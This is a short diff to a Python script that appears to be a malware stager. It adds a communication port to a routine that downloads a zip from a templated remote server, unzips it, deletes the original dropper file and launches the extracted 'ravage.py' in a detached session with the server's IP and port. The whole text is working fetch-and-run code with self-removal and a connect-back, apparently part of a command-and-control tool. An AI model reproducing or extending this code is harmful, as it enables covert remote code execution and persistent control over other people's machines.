@@ -17,6 +17,7 @@ RAVAGE_DIR = os.path.realpath('/home/sam/Desktop/ravage-tmp')
 SOUNDWAVE_IP = '<>SOUNDWAVE_IP</>'
 RAVAGE_IP = '<>RAVAGE_IP</>'
 WEB_SERVER_PORT = '<>WEB_SERVER_PORT</>'
+COMMUNICATION_PORT = '<>COMMUNICATION_PORT</>'
 
 
 with request.urlopen(f'http://{SOUNDWAVE_IP}:{WEB_SERVER_PORT}/ravage') as res:
@@ -29,5 +30,5 @@ with open(f'{RAVAGE_DIR}/ravage.zip', 'wb') as fh:
 os.system(f'unzip -o -q {RAVAGE_DIR}/ravage.zip -d {RAVAGE_DIR}/')
 os.system(f'rm -rf {WHEELIE_PATH}')
 
-subprocess.Popen(['python3', f'{RAVAGE_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP],
+subprocess.Popen(['python3', f'{RAVAGE_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP, COMMUNICATION_PORT],
                  cwd=RAVAGE_DIR, start_new_session=True)
